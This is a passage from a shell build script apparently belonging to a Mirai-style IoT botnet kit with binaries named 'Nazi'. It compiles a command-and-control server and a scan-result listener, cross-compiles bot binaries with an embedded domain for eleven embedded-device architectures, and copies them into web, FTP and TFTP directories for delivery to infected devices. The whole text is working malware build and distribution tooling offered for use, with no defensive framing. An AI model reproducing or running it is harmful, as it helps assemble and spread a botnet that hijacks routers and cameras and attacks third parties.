...
mkdir /var/www/html
mkdir /var/www/html/Nazi
go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/
go build -o loader/scanListen scanListen.go
echo "COMPILING i586$domainres"
compile_bot i586 Nazi.x86 "$FLAGS $domain -static"
echo "COMPILING mips$domainres"
compile_bot mips Nazi.mips "$FLAGS $domain -static"
echo "COMPILING mipsel$domainres"
compile_bot mipsel Nazi.mpsl "$FLAGS $domain -static"
echo "COMPILING armv4l$domainres"
compile_bot armv4l Nazi.arm "$FLAGS $domain -static"
echo "COMPILING armv5l$domainres"
compile_bot armv5l Nazi.arm5 "$FLAGS $domain"
echo "COMPILING armv6l$domainres"
compile_bot armv6l Nazi.arm6 "$FLAGS $domain -static"
echo "COMPILING armv7l$domainres"
compile_bot armv7l Nazi.arm7 "$FLAGS $domain -static"
echo "COMPILING ppc$domainres"
compile_bot powerpc Nazi.ppc "$FLAGS $domain -static"
echo "COMPILING sparc$domainres"
compile_bot sparc Nazi.spc "$FLAGS $domain -static"
echo "COMPILING m68k$domainres"
compile_bot m68k Nazi.m68k "$FLAGS $domain -static"
echo "COMPILING sh4$domainres"
compile_bot sh4 Nazi.sh4 "$FLAGS $domain -static"
cp release/Nazi* /var/www/html/Nazi
cp release/Nazi* /var/ftp
mv release/Nazi* /var/lib/tftpboot
rm -rf release
###################################################################
